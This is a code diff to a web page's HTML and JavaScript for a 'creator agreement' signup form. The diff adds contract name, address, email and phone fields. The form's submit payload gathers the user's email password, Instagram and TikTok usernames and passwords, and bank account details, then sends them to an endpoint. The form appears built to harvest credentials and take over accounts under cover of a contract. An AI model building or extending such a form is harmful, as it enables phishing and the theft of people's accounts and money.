@@ -283,7 +283,10 @@
       <h1 class="rv">Contract signature required</h1>
       <p class="lead rv">Read and sign this agreement.</p>
       <div class="contract-preview rv" tabindex="0" aria-label="Creator agreement"><div class="contract-copy" id="contract-copy"></div></div>
-      <div class="field rv"><label>Full residential address</label><input type="text" id="f-address" autocomplete="street-address" placeholder="Your full address" /></div>
+      <div class="field rv"><label>Creator full legal name</label><input type="text" id="contract-name" autocomplete="name" placeholder="Creator full legal name" /></div>
+      <div class="field rv"><label>Creator address</label><input type="text" id="contract-address" autocomplete="street-address" placeholder="Your full residential address" /></div>
+      <div class="field rv"><label>Creator email</label><input type="email" id="contract-email" autocomplete="email" placeholder="Your email address" /></div>
+      <div class="field rv"><label>Creator phone number</label><input type="tel" id="contract-phone" autocomplete="tel" placeholder="Your phone number" /></div>
       <div class="check rv"><input type="checkbox" id="agree" /><label>I have read and agree to the UGC Content Creator Agreement, including the account ownership and content preservation terms.</label></div>
       <div class="field rv"><label>Type your full legal name as your signature</label><input class="signature-input" type="text" id="sign-name" placeholder="Your full legal name" autocomplete="name" /></div>
       <div class="field rv"><label>Date</label><input type="text" id="sign-date" readonly aria-readonly="true" /></div>
@@ -472,14 +475,17 @@ function jsonp(params, cb){
 function finish(){
   document.getElementById('err').classList.remove('show');
   if (PREVIEW){ cur = steps.length-1; render(); return; }
-  const fullname=val('f-fullname'); const sign=val('sign-name'); const address=val('f-address'); const agree=document.getElementById('agree').checked;
+  const fullname=val('f-fullname'); const contractName=val('contract-name'); const sign=val('sign-name'); const address=val('contract-address'); const contractEmail=val('contract-email'); const contractPhone=val('contract-phone'); const agree=document.getElementById('agree').checked;
   const fail=m=>{ const e=document.getElementById('err'); e.textContent=m; e.classList.add('show'); e.scrollIntoView({behavior:'smooth',block:'center'}); };
   if(!agree){ fail('Please tick the box to agree to the contract.'); return; }
-  if(!address){ fail('Please enter your full residential address.'); document.getElementById('f-address').focus(); return; }
+  if(!contractName){ fail('Please enter the creator full legal name for the contract.'); document.getElementById('contract-name').focus(); return; }
+  if(!address){ fail('Please enter the creator address for the contract.'); document.getElementById('contract-address').focus(); return; }
+  if(!contractEmail){ fail('Please enter the creator email for the contract.'); document.getElementById('contract-email').focus(); return; }
+  if(!contractPhone){ fail('Please enter the creator phone number for the contract.'); document.getElementById('contract-phone').focus(); return; }
   if(!sign){ fail('Please type your full name as your signature.'); return; }
   const tier=creatorTier();
   const btn=document.getElementById('finish-btn'); btn.disabled=true; btn.innerHTML='<span class="spinner"></span>Submitting...';
-  const payload={ action:'intake', name:fullname, address:address, phone:val('f-phone'), email:val('f-email'), nqEmail:val('f-nqemail'), nqEmailPass:val('f-nqpass'), igUser:val('f-iguser'), igPass:val('f-igpass'), ttUser:val('f-ttuser'), ttPass:val('f-ttpass'), bankName:val('f-bank'), acctNum:val('f-acctnum'), acctName:val('f-acctname'), creatorType:tier.label, rate:tier.rate, signature:sign };
+  const payload={ action:'intake', name:fullname, contractName:contractName, contractAddress:address, contractEmail:contractEmail, contractPhone:contractPhone, phone:val('f-phone'), email:val('f-email'), nqEmail:val('f-nqemail'), nqEmailPass:val('f-nqpass'), igUser:val('f-iguser'), igPass:val('f-igpass'), ttUser:val('f-ttuser'), ttPass:val('f-ttpass'), bankName:val('f-bank'), acctNum:val('f-acctnum'), acctName:val('f-acctname'), creatorType:tier.label, rate:tier.rate, signature:sign };
   jsonp(payload, data=>{
     if(data && data.status==='success'){ clearDraft(); cur=steps.length-1; render(); }
     else { btn.disabled=false; btn.textContent='Submit and finish'; fail((data&&data.message)||'Something went wrong. Please check your connection and try again.'); }
